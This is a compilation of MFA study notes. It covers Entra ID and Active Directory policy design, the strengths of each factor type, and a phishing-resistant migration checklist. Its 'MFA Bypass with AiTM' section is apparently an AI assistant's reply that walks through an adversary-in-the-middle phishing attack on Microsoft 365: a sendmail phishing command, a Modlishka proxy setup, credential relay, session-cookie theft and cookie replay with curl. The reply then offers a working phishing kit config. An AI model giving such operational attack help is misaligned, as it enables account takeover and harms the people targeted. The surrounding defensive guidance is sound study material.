## **1. Overview**

Multi-Factor Authentication (MFA) strengthens identity security by requiring **two or more verification factors**:

* Something you **know** (password/PIN)
* Something you **have** (phone, token, security key)
* Something you **are** (biometrics)

MFA significantly reduces risks from:

* Credential theft
* Phishing attacks
* Password reuse
* Brute-force attacks

---

# **2. MFA Policy Design (Core Architecture)**

A well-designed MFA policy balances **security, usability, and operational overhead**.

### **Key Design Principles**

* **Zero Trust aligned** (never trust, always verify)
* **Risk-based enforcement** (adaptive MFA)
* **Least privilege access**
* **User experience optimization**

### **Policy Components**

* **User Scope**

  * Administrators (mandatory MFA)
  * Privileged roles
  * Remote users
  * High-risk users
  * Third-party users

* **Authentication Methods**

  * Microsoft Authenticator (preferred)
  * FIDO2 security keys (phishing-resistant)
  * Push notifications
  * OTP (TOTP/HOTP)
  * SMS/Voice (least secure – fallback only)

* **Conditional Access Controls**

  * Location-based (trusted vs untrusted)
  * Device compliance (managed vs unmanaged)
  * Application sensitivity
  * Risk-based (user/sign-in risk)

* **Session Controls**

  * Reauthentication frequency
  * Persistent sessions
  * Token lifetime

---

# **3. Prerequisites**

## **Microsoft Entra (Azure AD)**

* Entra ID P1/P2 license (for Conditional Access, risk-based MFA)
* Identity sources configured (cloud or hybrid)
* Defined user groups and roles
* Logging enabled (Sign-in logs, audit logs)

## **On-Premises Active Directory**

* AD DS environment
* Azure AD Connect (for hybrid identity)
* Network connectivity to Entra services
* NPS extension (for VPN/RADIUS MFA)

## **Windows Systems**

* Windows 10/11 or Server versions
* Device joined (Azure AD / Hybrid / Domain)
* Windows Hello for Business (optional for passwordless)

## **Linux Systems**

* SSH access control framework (PAM)
* MFA modules (Google Authenticator PAM / Duo / RADIUS)
* Integration with identity provider (LDAP / SSSD / Entra via federation)

---

# **4. MFA Implementation**

## **A. Microsoft Entra MFA**

### **Step-by-Step**

1. Enable **Authentication Methods Policy**
2. Configure allowed methods:

   * Authenticator app
   * FIDO2 keys
   * Temporary Access Pass (TAP)
3. Configure **Conditional Access Policies**:

   * Require MFA for all users (baseline)
   * Enforce stricter MFA for admins
4. Enable **SSPR with MFA**
5. Configure **Registration Campaign**

   * Force users to register MFA

---

## **B. Active Directory (Hybrid MFA)**

### **Approaches**

* **NPS Extension for MFA**

  * Protect VPN, RADIUS apps
* **ADFS with MFA Adapter**
* **Azure AD Application Proxy**

  * Secure on-prem apps with Entra MFA

---

## **C. Windows MFA Integration**

* Windows Hello for Business (biometric + PIN)
* Smart card / FIDO2 login
* Conditional Access for device compliance
* BitLocker + TPM for device security

---

## **D. Linux MFA Integration**

### **Common Methods**

* PAM-based MFA (Google Authenticator)
* SSH MFA enforcement
* RADIUS integration with Entra MFA

### **Example Flow**

* User logs in via SSH
* Password + OTP required
* Verified via PAM module

---

# **5. MFA Registration Policy**

### **Purpose**

Ensure all users **securely enroll MFA methods** before accessing resources.

### **Key Features**

* Enforced via **Authentication Methods Policy**
* Integrated with **Conditional Access**
* Can be triggered:

  * At first login
  * During risk events
  * Via registration campaign

### **Best Practices**

* Require **at least 2 methods**
* Prefer **phishing-resistant methods**
* Use **Temporary Access Pass (TAP)** for onboarding
* Block weak methods unless necessary

---

# **6. MFA Enrollment Procedures**

### **Standard User Enrollment**

1. User signs in
2. Prompted for MFA setup
3. Registers:

   * Authenticator app (scan QR)
   * Backup method (phone/email)
4. Completes verification

### **Admin Enrollment**

* Mandatory MFA before role activation
* Enforced via Privileged Identity Management (PIM)

### **Bulk Enrollment Strategy**

* Phase 1: IT/Admin users
* Phase 2: High-risk users
* Phase 3: All users

---

# **7. Multi-Factor Authentication Standard**

### **Minimum Security Standard**

* MFA required for:

  * All users
  * All external access
  * All privileged roles

### **Approved Methods**

| Method            | Security Level |
| ----------------- | -------------- |
| FIDO2 / Passkeys  | High           |
| Authenticator App | High           |
| Push Notification | Medium         |
| OTP (TOTP)        | Medium         |
| SMS/Voice         | Low            |

### **Policy Rules**

* SMS/Voice only as fallback
* Disable legacy authentication
* Enforce phishing-resistant MFA for admins
* Require device compliance for sensitive apps

---

# **8. Operations and Management**

## **User Management**

* Self-service MFA reset
* Method update and recovery
* Temporary Access Pass for recovery

## **Help Desk Operations**

* Identity verification before reset
* MFA reset procedures
* Lost device handling

## **Exception Handling**

* Avoid MFA bypass
* Use Conditional Access exclusions carefully
* Monitor service accounts separately

---

# **9. Monitoring and Auditing**

### **Key Logs**

* Sign-in logs
* Audit logs
* Risk detections

### **Monitoring Tools**

* Entra ID portal
* SIEM (e.g., Microsoft Sentinel)

### **Alerts**

* Multiple failed MFA attempts
* Unusual locations
* MFA fatigue attacks

---

# **10. Security Enhancements**

* Enable **Passwordless Authentication**
* Deploy **FIDO2 security keys**
* Use **Risk-based Conditional Access**
* Implement **Continuous Access Evaluation**
* Block **legacy protocols (IMAP, POP, SMTP basic auth)**

---

# **11. Common Risks & Mitigations**

| Risk                | Mitigation                      |
| ------------------- | ------------------------------- |
| MFA fatigue attacks | Number matching, user awareness |
| SIM swapping        | Avoid SMS MFA                   |
| Phishing            | Use FIDO2/passkeys              |
| Lost device         | Backup methods + TAP            |
| Misconfiguration    | Regular audits                  |

---

# **12. Best Practices Summary**

* Enforce MFA for **all users**
* Prefer **phishing-resistant methods**
* Use **Conditional Access**, not per-user MFA
* Enable **SSPR with MFA**
* Monitor continuously
* Train users regularly

---

If you want, I can also convert this into:

* **IAM audit checklist**
* **Step-by-step implementation guide (with screenshots style)**
* **Architecture diagram**
* **Comparison: Entra vs AD vs third-party MFA tools**


What is Authentication?
Authentication is the process of verifying who someone is. It ensures that the person trying to access a system or service is really who they say they are.
•	Traditionally, authentication involved just a username and password.
•	But passwords alone can be risky because of cyber-attacks like brute-force attacks where attackers guess passwords repeatedly.
•	Because of this, additional security measures have been added to make authentication safer.

What is Multi-Factor Authentication (MFA)?
Multi-Factor Authentication (MFA) means using two or more different ways to confirm your identity before granting access. This adds extra security and makes it much harder for unauthorized people to get in, even if they have your password.
MFA uses factors from these categories:
•	Something you know: Password, PIN, or passphrase.
•	Something you have: A physical device like a security token, smart card, or your mobile phone.
•	Something you are: Your biometric data like fingerprints, face recognition, or voice.
•	Somewhere you are: Location verification like IP address or GPS.

Why is MFA Important?
•	Better security: It greatly reduces the chance of unauthorized access.
•	Protects sensitive info: Makes it harder for hackers to steal data.
•	Stronger account protection: Adds layers beyond just passwords.

Common MFA Methods
•	Passwords or PINs (something you know)
•	Mobile phone apps or hardware tokens that generate codes (something you have)
•	Biometric scans such as fingerprints or facial recognition (something you are)
•	Location checks like verifying your device’s IP or geographic location (somewhere you are)

Other Security Enhancements
•	Password Managers: Tools that create and store strong, unique passwords.
•	Phishing Awareness: Training users to avoid scams that steal passwords.
•	Regular Password Checks: Auditing for weak or compromised passwords.
•	Biometric Limitations: Facial recognition is easy to use but can be fooled by advanced tech; voice recognition can be tricked by recordings.
•	Location-based Security: Restrict access to certain areas or IP addresses.
•	Risk-Based Authentication: Adjusting security checks depending on how risky the access request is.

Best Practices for Strong MFA
•	Use multiple different factors together.
•	Keep your systems and software updated to fix security holes.
•	Train employees about strong passwords, phishing, and MFA use.
•	Have an incident response plan for handling security breaches.
•	Continuously monitor and improve your authentication systems.

Other Related Concepts
•	One-Time Password (OTP): A password valid for only one use, often sent via SMS or email.
•	CAPTCHA: A test to tell humans and bots apart, like typing distorted letters.
•	Initialization Vector (IV): A random number used to make encrypted data more secure.
•	Extensible Authentication Protocol (EAP): A flexible framework used for network authentication.
•	Biometrics: Physical characteristics used for identification, which must be accurate and user-friendly.

Summary
Authentication proves who you are. MFA makes it safer by requiring multiple ways to verify your identity — such as something you know, have, or are. This extra layer protects your accounts and sensitive data from attackers. Combining MFA with strong password habits, user training, and continuous security updates creates a much safer environment for everyone.


Multi-factor Authentication

Implement phishing resistant MFA
•	Multifactor Authentication (MFA) requires users to verify their identity with two or more authentication factors (something you know, have, or are).
•	MFA significantly reduces the risk of account compromise, especially from phishing, password spraying, and credential theft.
•	However, not all MFA methods offer equal protection; some are vulnerable to phishing, push bombing (push fatigue), SS7 protocol exploits, and SIM swap attacks.
•	Phishing-resistant MFA is the most secure form and strongly recommended as part of a Zero Trust security model.
•	US government agencies are mandated to adopt phishing-resistant MFA methods.

Cyber Threats to MFA
•	Phishing: Attackers trick users into providing passwords and OTPs on fake login pages.
•	Push Bombing: Attackers flood users with push notifications hoping they approve one.
•	SS7 Exploits: Intercept SMS or voice MFA codes by exploiting telecom protocol vulnerabilities.
•	SIM Swap: Attackers hijack a phone number via social engineering of mobile carriers.

MFA Methods Ranked by Security (Table 1)

Authentication Form	Security Strength	Vulnerabilities
Phishing-Resistant MFA:	Strongest (Gold standard)	Resistant to phishing, push bombing, SS7, SIM swap
- FIDO/WebAuthn		
- PKI-based MFA (e.g., smart cards)		
App-based MFA:	Moderate	Vulnerable to phishing, resistant to push bombing
- OTP apps		
- Mobile push with number matching		
App-based MFA:	Weaker	Vulnerable to push bombing
- Mobile push without number matching		
SMS or Voice	Weakest	Vulnerable to phishing, SS7, SIM swap

Note: SMS/voice MFA should only be a last resort or temporary solution.

Recommended Implementation Approach
•	Prioritize systems and users:
o	Protect high-value resources (e.g., email, file servers, identity servers).
o	Focus first on high-risk users (e.g., admins, helpdesk, legal, HR).
•	Phased rollout:
o	Start with groups most at risk or easiest to onboard.
o	Expand gradually based on lessons learned.
•	Address legacy systems:
o	Identify systems that don’t support phishing-resistant MFA.
o	Upgrade or replace these systems, or integrate them with enterprise SSO/MFA gateways.
•	Manage user adoption:
o	Communicate risks of weak or no MFA to senior leadership.
o	Leadership should support and lead cultural changes for adoption.

Phishing-Resistant MFA Implementations
FIDO/WebAuthn
•	Industry standard for phishing-resistant authentication.
•	Supported broadly by browsers, OS, and devices.
•	Uses physical tokens (USB, NFC) or built-in device authenticators.
•	Combines “something you have” with biometrics or PIN.
PKI-Based MFA
•	Uses smart cards or hardware tokens with cryptographic certificates.
•	Strong security but requires mature identity management.
•	Common in government (e.g., PIV, CAC cards).
•	Less broadly supported outside large, complex organizations.
Additional Resources
•	CISA MFA webpage and fact sheets
•	FIDO Alliance specifications (FIDO2, U2F, UAF, CTAP)
•	Guidance on number matching to improve push notification MFA

Summary:
To maximize account security in Microsoft Entra ID and enterprise systems, organizations should migrate to phishing-resistant MFA (FIDO/WebAuthn or PKI-based). While any MFA is better than none, phishing-resistant MFA greatly reduces risk from advanced attacks like phishing, push bombing, SS7 exploits, and SIM swap. Phased implementation focusing on high-value assets and users, plus leadership buy-in and legacy system integration, is key to success.



Entra Phishing-Resistant MFA Migration Plan & Checklist

Phase 1: Preparation & Planning
1. Assess Current Environment
•	Inventory all accounts and user types in Entra ID.
•	Identify high-value accounts (admins, privileged roles, helpdesk, HR, legal).
•	Identify business-critical applications integrated with Entra ID.
•	Identify applications and services that support MFA, especially phishing-resistant MFA (FIDO2/WebAuthn, PKI).
•	Identify legacy apps/systems that do not support modern MFA.
2. Leadership Engagement & Communication
•	Present MFA risk assessment and phishing attack impact to senior leadership.
•	Obtain approval and commitment for phased rollout.
•	Develop user communication plan emphasizing security benefits and expectations.
3. Select MFA Methods
•	Default to FIDO2/WebAuthn security keys or built-in device authenticators for phishing-resistant MFA.
•	Use PKI smart cards if applicable and infrastructure mature.
•	For users/systems unable to immediately migrate, enable app-based OTP with number matching.
•	Disable SMS/voice MFA unless absolutely necessary as a temporary fallback.
________________________________________
Phase 2: Pilot Deployment
4. Pilot Group Selection
•	Choose high-value users and IT administrators for initial deployment.
•	Ensure they have compatible devices or provide security keys.
5. Configure Microsoft Entra ID Settings
•	Enable and enforce FIDO2 security key registration and sign-in.
•	Enable passwordless authentication options (Windows Hello for Business, Microsoft Authenticator).
•	Configure Conditional Access policies:
o	Require phishing-resistant MFA for targeted groups and sensitive apps.
o	Enforce number matching for push notifications where app-based MFA used.
•	Enable monitoring and alerting on MFA failures and suspicious login attempts.
6. User Training & Support
•	Provide training materials on how to use security keys and passwordless sign-in.
•	Set up support channels for issues during pilot.
•	Collect user feedback and track adoption challenges.

Phase 3: Expansion & Enforcement
7. Roll Out to Additional Groups
•	Expand rollout to all privileged users (e.g., global admins, privileged role administrators).
•	Gradually include all employees in waves.
•	Continue enforcing phishing-resistant MFA with Conditional Access.
8. Integrate Legacy Systems
•	For apps without native phishing-resistant MFA:
o	Use Azure AD Application Proxy with MFA enforcement.
o	Use third-party MFA gateways or SSO providers that support FIDO2.
•	Plan migration or replacement for unsupported legacy systems.
9. Strengthen Policies
•	Configure Continuous Access Evaluation and risk-based Conditional Access.
•	Block legacy authentication protocols that bypass MFA.
•	Regularly review and update MFA policies based on threat intelligence and usage data.

Phase 4: Full Enforcement & Continuous Improvement
10. Full Enforcement
•	Enforce phishing-resistant MFA for all users and services.
•	Disable fallback to SMS/voice MFA completely unless exceptions are approved and tracked.
11. Monitor & Respond
•	Continuously monitor login patterns and MFA challenges.
•	Investigate push bombing or suspicious MFA activity.
•	Provide ongoing user training and refreshers.
12. Audit & Report
•	Periodically audit MFA coverage and compliance.
•	Report to senior leadership on adoption status and security improvements.

Additional Best Practices
•	Security Key Provisioning: Provide users with FIDO2-compliant security keys (YubiKey, Feitian, etc.) or enable platform authenticators.
•	Biometrics & PIN: Encourage use of biometric or PIN factors combined with security keys for better usability and security.
•	Backup Options: Have secure fallback options (e.g., temporary access codes managed by helpdesk with strict controls).
•	Incident Response: Define procedures for lost/stolen security keys or compromised accounts.

Microsoft Entra ID: Multi-Factor Authentication (MFA) Summary
Introduction
Multi-Factor Authentication (MFA), also known as Two-Factor Authentication (2FA), requires users to present more than one type of evidence (factor) to authenticate. There are four main types of factors:

Factor	Examples
Something You Know	Passwords, PINs, security questions
Something You Have	Hardware/software tokens, certificates, email, SMS, phone calls
Something You Are	Biometrics like fingerprints, facial recognition, iris scans
Location	Source IP ranges, geolocation

Note: Using multiple proofs of the same factor (e.g., password + PIN) is not true MFA, though it can add some security.
While MFA has weaknesses against some targeted attacks, any MFA is better than none.
________________________________________
Advantages of MFA
•	Passwords are often weak, reused, or stolen; MFA mitigates this risk effectively.
•	Microsoft research shows MFA could prevent 99.9% of account compromises caused by password attacks like brute-force, credential stuffing, and password spraying.
•	MFA defends systems assuming password compromise is inevitable.
________________________________________
Disadvantages of MFA
•	Increases management complexity for admins and users.
•	Some users may struggle with setup or lose access to their secondary factors.
•	MFA adds complexity to applications and may introduce external dependencies or single points of failure.
•	MFA reset or bypass mechanisms may be exploited if not securely designed.
•	Hardware-dependent MFA methods can increase cost and overhead.
•	May inadvertently block legitimate users from access.
________________________________________
Quick Recommendations
•	Allow users to opt-in to MFA, preferably using TOTP (Time-Based One-Time Password) apps.
•	Require MFA for all administrative and high-privilege accounts.
•	Consider whitelisting trusted IP ranges (e.g., corporate networks) to reduce MFA prompts.
•	Allow users to remember MFA on trusted browsers to improve usability.
•	Implement a secure, user-friendly MFA reset process to avoid lockouts.


Implementing Multi-Factor Authentication (MFA)
When to Require MFA
•	Always require MFA at user login.
•	Also require MFA for sensitive actions such as:
o	Changing passwords or security questions.
o	Changing the email address linked to the account.
o	Disabling MFA.
o	Elevating session privileges (e.g., to administrative level).
•	If the application supports multiple authentication methods (e.g., API login, mobile app), all should require MFA or equivalent protections.
________________________________________
Improving Usability
•	Frequent MFA prompts can frustrate users and lead to disabling MFA, so balance usability and security:
o	Allow users to remember trusted browsers, avoiding MFA on every login. This should use secure methods beyond just cookies (e.g., tie cookies to IP address).
o	Whitelist corporate IP ranges or use location as a secondary factor to reduce MFA prompts. (Note: this doesn't protect against insider threats or compromised devices.)
o	Consider requiring MFA only for sensitive actions, not every login, based on application risk.
________________________________________
Handling Failed Login Attempts with MFA
•	Failed MFA after correct password may indicate:
o	User lost or can’t access their second factor (phone lost, no signal).
o	Possible compromised password attempt.
•	Recommended actions:
o	Prompt for alternate MFA methods (e.g., SMS if hardware token fails).
o	Allow users to reset MFA securely.
o	Notify users of failed login attempts with details (time, browser, geo-location), encourage password change if unrecognized. Notifications should appear on next login and optionally via email.
________________________________________
Resetting MFA
•	Users may lose access to MFA for various reasons: device lost, phone reset, new number, etc.
•	Provide secure mechanisms to regain access without compromising security:
o	No single “best” method; depends on application security level and user base.
•	Possible approaches:
o	Issue single-use recovery codes at MFA setup for users to store securely.
o	Require setup of multiple MFA types (e.g., certificate + OTP + SMS) to reduce lockout risk.
o	Mail recovery codes or hardware tokens physically to users.
o	Require users to contact support with strong identity verification processes.
o	Use trusted users to vouch for account recovery in some environments.
________________________________________
Summary:
MFA implementation should protect both login and sensitive actions, balance security with usability, and include robust yet user-friendly recovery processes to avoid lockouts while preventing attacker bypass.



Something You Know 
The most common type of authentication is based on something the users know - typically, a password. The biggest advantage of this factor is that it has very low requirements for both the developers and the end user, as it 
does not require any special hardware, or integration with other services. 
2 
Passwords and PINs 
Passwords and PINs are the most common form of authentication due to the simplicity of implementing them. The Authentication Cheat Sheet 
has guidance on how to implement a strong password policy, and the Password Storage Cheat Sheet has guidance on how to securely store 
passwords. Most multi-factor authentication systems make use of a password, as well as at least one other factor. It should be noted that PINs, 
“secret words” and other similar type of information are all effectively the same as passwords. Using two different types of passwords does not 
constitute MFA. 
Pros 
• Simple and well understood. 
• Native support in every authentication framework. 
• Easy to implement. 
Cons 
• Users are prone to choosing weak passwords. 
• Passwords are commonly re-used between systems. 
• Susceptible to phishing. 
Security Questions 
Security questions require the user to choose (or create) several questions that only they will know the answer to. These are effectively the 
same as passwords, although they are generally considered weaker. The Choosing and Using Security Questions Cheat Sheet contains further 
guidance on how to implement these securely. 
Pros 
• Simple and well understood. 
Cons 
• Questions often have easily guessable answers. 
• Answers to questions can often be obtained from social media or other sources. 
• Questions must be carefully chosen so that users will remember answers years later. 
• Susceptible to phishing. 
Something You Have 
The second factor is something that the user possesses. This could be a physical item (such as a hardware token), a digital item (such as a 
certificate or private key), or based on the ownership of a mobile phone, phone number, or email address (such as SMS or a software token 
installed on the phone, or an email with a single-use verification code). 
If properly implemented then this can be significantly more difficult for a remote attacker to compromise; however, it also creates an additional 
administrative burden on the user, as they must keep the authentication factor with them whenever they wish to use it. 
The requirement to have a second factor can also limit certain types of users’ ability to access a service. For example, if a user does not have 
access to a mobile phone, many types of MFA will not be available for them. 
Hardware OTP Tokens 
Physical hardware OTP tokens can be used which generate constantly changing numeric codes, which must be submitted when authentication 
on the application. Most well-known of these is the RSA SecureID, which generates a six-digit number that changes every 60 seconds. 
Pros 
• As the tokens are separate physical devices, they are almost impossible for an attacker to compromise remotely. 
• Tokens can be used without requiring the user to have a mobile phone or other device. 
Cons 
• Deploying physical tokens to users is expensive and complicated. 
• If a user loses their token, it could take a significant amount of time to purchase and ship them a new one. 
• Some implementations require a backend server, which can introduce new vulnerabilities as well as a single point of failure. 
• Stolen tokens can be used without a PIN or device unlock code. 
• Susceptible to phishing (although short-lived). 
Software TOTP Tokens 
A cheaper and easier alternative to hardware tokens is using software to generate 
Time-based One Time Password (TOTP) codes. This would typically involve the user installing a TOTP application on their mobile phone, and 
then scanning a QR code provided by the web application which provides the initial seed. The authenticator app then generates a six-digit 
number every 60 seconds, in much the same way as a hardware token. 
3 
Most websites use standardized TOTP tokens, allowing the user to install any authenticator app that supports TOTP. However, a small number 
of applications use their own variants of this (such as Symantec), which requires the users to install a specific app to use the service. This 
should be avoided in favour of a standards-based approach. 
Pros 
• The absence of physical tokens greatly reduces the cost and administrative overhead of implementing the system. 
• When users lose access to their TOTP app, a new one can be configured without needing to ship a physical token to them. 
• TOTP is widely used, and many users will already have at least one TOTP app installed. 
• If the user has a screen lock on their phone, an attacker will be unable to use the code if they steal the phone. 
Cons 
• TOTP apps are usually installed on mobile devices, which are vulnerable to compromise. 
• The TOTP app may be installed on the same mobile device (or workstation) that is used to authenticate. 
• Users may store the backup seeds insecurely. 
• Not all users have mobile devices to use with TOTP. 
• If the user’s mobile device is lost, stolen or out of battery, they will be unable to authenticate. 
• Susceptible to phishing (although short-lived). 
Hardware U2F Tokens 
Hardware U2F tokens communicate with the user’s workstation over USB or NFC, and implement challenge-response based authentication, 
rather than requiring the user to manually enter the code. This would typically be done by the user pressing a button on the token, or tapping it 
against their NFC reader. 
Pros 
• Longer codes can be used, which may provide a higher level of security. 
• Users can simply press a button rather than typing in a code. 
• Resistant to phishing. 
Cons 
• As with hardware OTP tokens, the use of physical tokens introduces significant costs and administrative overheads. 
• Stolen tokens can be used without a PIN or device unlock code. 
• As the tokens are usually connected to the workstation via USB, users are more likely to forget them. 
Certificates 
Digital certificates are files that are stored on the user’s device which are automatically provided alongside the user’s password when 
authenticating. The most common type is X.509 certificates (discussed in the Transport Layer Protection Cheat Sheet), more commonly known 
as client certificates. 
Certificates are supported by all major web browsers, and once installed require no further interaction from the user. The certificates should be 
linked to an individual’s user account to prevent users from trying to authenticate against other accounts. 
Pros 
• There is no need to purchase and manage hardware tokens. 
• Once installed, certificates are very simple for users. 
• Certificates can be centrally managed and revoked. 
• Resistant to phishing. 
Cons 
• Using digital certificates requires backend PKI system. 
• Installing certificates can be difficult for users, particularly in a highly restricted environment. 
• Enterprise proxy servers which perform SSL decryption will prevent the use of certificates. 
• The certificates are stored on the user’s workstation, and as such can be stolen if their system is compromised. 
Smartcards 
Smartcards are credit-card size cards with a chip containing a digital certificate for the user, which is unlocked with a PIN. They are commonly 
used for operating system authentication, but are rarely used in web applications. 
Pros 
• Stolen smartcards cannot be used without the PIN. 
• Smartcards can be used across multiple applications and systems. 
• Resistant to phishing. 
Cons 
• Managing and distributing smartcards has the same costs and overheads as hardware tokens. 
• Smartcards are not natively supported by modern browsers, so require third party software. 
• Although most business-class laptops have smartcard readers built in, home systems often do not. 
• The use of smartcards requires functioning backend PKI systems. 
4 
SMS Messages and Phone Calls 
SMS messages or phone calls can be used to provide users with a single-use code that they must submit as a second factor. 
Pros 
• Relatively simple to implement. 
• Requires user to link their account to a mobile number. 
Cons 
• Requires the user to have a mobile device or landline. 
• Require user to have signal to receive the call or message. 
• Calls and SMS messages may cost money to send (need to protect against attackers requesting many messages to exhaust funds. 
• Several attacks against SMS or mobile numbers have been demonstrated and exploited in the past. 
• SMS messages may be received on the same device the user is authenticating from. 
• Susceptible to phishing. 
Email 
Email verification requires that the user enters a code or clicks a link sent to their email address. There is some debate as to whether email 
constitutes a form of MFA, because if the user does not have MFA configured on their email account, it simply requires knowledge of the user’s 
email password (which is often the same as their application password). However, it is included here for completeness. 
Pros 
• Very easy to implement. 
• No requirements for separate hardware or a mobile device. 
Cons 
• Relies entirely on the security of the email account, which often lacks MFA. 
• Email passwords are commonly the same as application passwords. 
• Provides no protection if the user’s email is compromised first. 
• Email may be received by the same device the user is authenticating from. 
• Susceptible to phishing. 
Something You Are 
The final factor in the traditional view of MFA is something you are - which is one of the physical attributes of the users (often called biometrics). 
Biometrics are rarely used in web applications due to the requirement for users to have specific hardware. 
Biometrics 
The are several common types of biometrics that are used, including: 
• Fingerprint scans 
• Facial recognition 
• Iris scans 
• Handprint scans 
Pros 
• Well-implemented biometrics are hard to spoof, and require a targeted attack. 
Cons 
• Require manual enrolment of the user’s physical attributes. 
• Custom (sometimes expensive) hardware is often required to read biometrics. 
• Modern browsers do not have native support, so custom client-side software is required. 
• Privacy concerns: Sensitive physical information must be stored about users. 
• If compromised, biometric data can be difficult to change. 
Location 
The use of location as a fourth factor for MFA is not fully accepted; however, it is increasingly be used for authentication. It is sometimes 
argued that location is used when deciding whether to require MFA (as discussed above) however this is effectively the same as considering it 
to be a factor. 
Two prominent examples of this are the Conditional Access Policies available in Microsoft Azure, and the Network Unlock functionality in 
BitLocker. 
When talking about location, access to the application that the user is authenticating against is not usually considered (as this would always be 
the case, and as such is relatively meaningless). 
5 
Source IP Ranges 
The source IP address the user is connecting from can be used as a factor, typically in an allow-list based approach. This could either be based 
on a static list (such as corporate office ranges) or a dynamic list (such as previous IP addresses the user has authenticated from). 
Pros 
• Very easy for users. 
• Requires minimal configuration and management from administrative staff. 
Cons 
• Does not provide any protection if the user’s system is compromised. 
• Does not provide any protection against rogue insiders. 
• Trusted IP addresses must be carefully restricted (for example, if the open guest Wi-Fi uses the main corporate IP range). 
Geolocation 
Rather than using the exact IP address of the user, the geographic location that the IP address is registered to can be used. This is less 
precise, but may be more feasible to implement in environments where IP addresses are not static. A common usage would be to require 
additional authentication factors when an authentication attempt is made from outside of the user’s normal country. 
Pros 
• Very easy for users 
Cons 
• Does not provide any protection if the user’s system is compromised. 
• Does not provide any protection against rogue insiders. 
• Easy for an attacker to bypass by obtaining IP addresses in the trusted country or location.


MFA Bypass with AiTM
Absolutely! Here's a detailed breakdown of each step in an AiTM (Adversary-in-the-Middle) phishing attack against Microsoft Entra ID MFA, including the technical commands, tools, and process that an attacker might use in a realistic scenario:

Step 1: Craft and Send Phishing Email with Malicious Link
•	Goal: Deliver a phishing link to the target user via email.
•	Tools:
o	Email phishing frameworks (e.g., Gophish, King Phisher, Social-Engineer Toolkit (SET))
o	SMTP server or compromised email account to send the email.
•	Example Command with Gophish:
# Set up phishing campaign with Gophish UI:
# - Create phishing email template with a fake document link.
# - Target user's email address added to the campaign.
# - Launch campaign to send emails.

# Alternatively, sending manually via SMTP with `sendmail`:

echo -e "Subject: Important Document\n\nPlease review this document: http://attacker-phishing-site.com/login" | sendmail victim@example.com
•	What Happens:
o	Victim receives email and is enticed to click the link.
________________________________________
Step 2: Victim Clicks Link and Lands on Fake Microsoft 365 Login Page
•	Goal: Present the victim with a fake login page identical to the real Microsoft 365 login page.
•	Tools:
o	AiTM phishing kits (e.g., Modlishka, Muraena, Evilginx2)
o	HTTPS reverse proxy with domain spoofing (e.g., using Let's Encrypt SSL certs for attacker-controlled domain)
•	Command (Example: starting Modlishka proxy):
# Modlishka config file setup (modlishka.json) specifying:
# - Legitimate URL: https://login.microsoftonline.com/
# - Attacker phishing domain: https://login.microsoft.com.fake-domain.com/

./modlishka -config modlishka.json
•	What Happens:
o	Victim sees authentic-looking M365 login UI but on attacker-controlled domain.
o	The phishing kit transparently proxies all traffic to the real M365.
________________________________________
Step 3: Victim Enters Username and Password; Credentials Are Proxied
•	Goal: Capture victim’s username and password; relay credentials in real time to Microsoft.
•	Tools:
o	AiTM proxy (e.g., Modlishka) captures POST request data.
o	Logs or database to store intercepted credentials.
•	How It Works:
o	Victim submits login form:
POST /login HTTP/1.1
Host: login.microsoft.com.fake-domain.com
Content-Type: application/x-www-form-urlencoded

username=victim@example.com&password=SuperSecret123
•	The proxy forwards this data to the real Microsoft login endpoint:
POST https://login.microsoftonline.com/login
Content-Type: application/x-www-form-urlencoded

username=victim@example.com&password=SuperSecret123
•	Proxy relays response back to victim seamlessly.
________________________________________
Step 4: Victim Completes MFA Challenge via Proxy
•	Goal: Intercept second factor prompt (e.g., push notification, OTP, or app code) and relay it to Microsoft.
•	How It Works:
o	Microsoft sends MFA prompt (push or OTP).
o	Victim receives prompt and submits second factor.
o	Proxy intercepts and forwards this token in real time to Microsoft.
•	Example Flow:
Victim: Approves push notification or enters OTP on phishing site.
Phishing Kit: Captures token and submits it to Microsoft.
Microsoft: Verifies second factor and grants session token.
________________________________________
Step 5: Session Cookie Issued and Stolen by Attacker
•	Goal: Steal the authenticated session cookie to access Microsoft 365 as the victim.
•	How It Works:
o	After successful authentication, Microsoft sets session cookies in HTTP response:
Set-Cookie: x-ms-session-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; Secure; HttpOnly; Path=/
•	Proxy intercepts these cookies and stores them for attacker use.
•	Example Modlishka logs:
[INFO] Session cookie stolen: x-ms-session-token=eyJhbGciOiJIUzI1NiIs...
________________________________________
Step 6: Attacker Uses Stolen Session Cookie to Access M365
•	Goal: Use stolen session cookie to impersonate victim without needing credentials or MFA.
•	How to Use Session Cookie:
o	Import session cookie into attacker’s browser or use curl/wget with cookie header.
•	Example Using curl:
curl -b "x-ms-session-token=eyJhbGciOiJIUzI1NiIs..." https://portal.office.com
•	Example in Browser:
o	Use browser dev tools to set cookie for microsoftonline.com domain.
o	Refresh portal.office.com and gain access as victim.
________________________________________
Summary of Tools Used:
Step	Tools / Commands
1	Gophish, sendmail, SMTP server
2	Modlishka, Evilginx2 (start phishing proxy)
3	POST request interception via proxy
4	Proxy MFA prompts and token submission
5	Capture and log session cookies from HTTP responses
6	Use stolen session cookie with curl or browser devtools
________________________________________
Additional Notes:
•	AiTM phishing kits require SSL certificates trusted by victim’s browser for stealth.
•	Attack relies on victim clicking link and submitting credentials.
•	Detection can be improved by MFA methods resistant to phishing (e.g., hardware FIDO2 keys).
•	Defenders should educate users and implement strong email filtering.
________________________________________
If you want, I can provide an example of setting up Modlishka or a proof-of-concept phishing kit config for Microsoft Entra ID MFA attacks. Would you like that?


Multifactor authentication (MFA)


What is MFA?
Multi-Factor Authentication (MFA) is a way to make logging into a system safer by asking users to prove who they are using two or more different methods, instead of just a password. This extra step helps protect accounts from being hacked.
________________________________________
Components of MFA:
•	Factors (Types of Proof):
These are different ways to verify identity:
1.	Something you know: Passwords, PINs, or passphrases.
2.	Something you have: Physical tokens, smartphones, or emails.
3.	Something you are: Biometrics like fingerprints or iris scans.
4.	Somewhere you are: Your physical location (based on IP or GPS).
•	One-Time Password (OTP):
A temporary code sent to you by SMS, phone call, email, or generated by an app. It can only be used once.
•	Authenticator App:
A smartphone app that generates OTPs or sends you a notification to approve a login.
________________________________________
Why Use MFA?
•	Better Security:
Even if someone steals your password, they usually cannot access your account without the second verification step, making it much harder for attackers.
________________________________________
Common MFA Methods:
•	OTP codes sent by SMS, calls, or authenticator apps.
•	Note: SMS is less secure because attackers can hijack phone numbers (called SIM swapping). Authenticator apps are safer.
________________________________________
Why is Authentication Important?
Cybercrime is increasing, and stolen passwords or identities are often used by criminals to break into accounts. Strong authentication like MFA helps stop unauthorized access and keeps data safe.
